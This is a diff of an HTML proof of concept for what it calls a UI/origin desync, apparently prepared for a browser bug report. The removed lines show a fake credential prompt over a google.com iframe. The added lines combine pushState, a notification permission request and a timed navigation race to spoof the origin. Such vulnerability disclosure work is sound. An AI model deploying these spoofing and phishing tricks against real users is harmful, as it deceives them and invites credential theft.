@@ -1,13 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Redirecting...</title>
+  <meta charset="utf-8">
+  <title>UI / Origin Desync PoC</title>
   <link rel="icon" href="https://www.google.com/favicon.ico">
+
   <style>
     html, body {
       margin: 0;
       padding: 0;
       overflow: hidden;
+      font-family: system-ui;
     }
     iframe {
       width: 100vw;
@@ -18,16 +21,66 @@
       left: 0;
       z-index: 1;
     }
+    #trigger {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+      padding: 10px 16px;
+      border-radius: 10px;
+      border: none;
+      background: #1a73e8;
+      color: white;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
-  <!-- Realistic-looking background -->
-  <iframe src="https://www.google.com"></iframe>
 
-  <script>
-    setTimeout(() => {
-      prompt("To continue to google.com, please confirm your credentials", "Email / Password");
-    }, 3500); // Give Google time to load visibly in iframe
-  </script>
+<button id="trigger">Start PoC</button>
+
+<!-- Visual context only -->
+<iframe src="https://www.google.com"></iframe>
+
+<script>
+/* simple beacon logger (optional) */
+function logEvent(type, extra = {}) {
+  console.log(type, extra);
+}
+
+const trigger = document.getElementById("trigger");
+
+/* Step 1: URL manipulation */
+trigger.onclick = () => {
+  logEvent("poc_started");
+
+  history.pushState({}, "", "/trusted");
+  logEvent("pushstate_done", { path: location.pathname });
+
+  // benign permission request (safe for crbug)
+  Notification.requestPermission().then(result => {
+    logEvent("notification_result", { result });
+  });
+};
+
+/* Step 2: Navigation race */
+window.addEventListener("pageshow", () => {
+  logEvent("pageshow");
+
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        logEvent("navigation_triggered", {
+          target: "https://google.com:9090"
+        });
+
+        location.href = "https://google.com:9090";
+      }, 80);
+    });
+  });
+});
+</script>
+
 </body>
 </html>
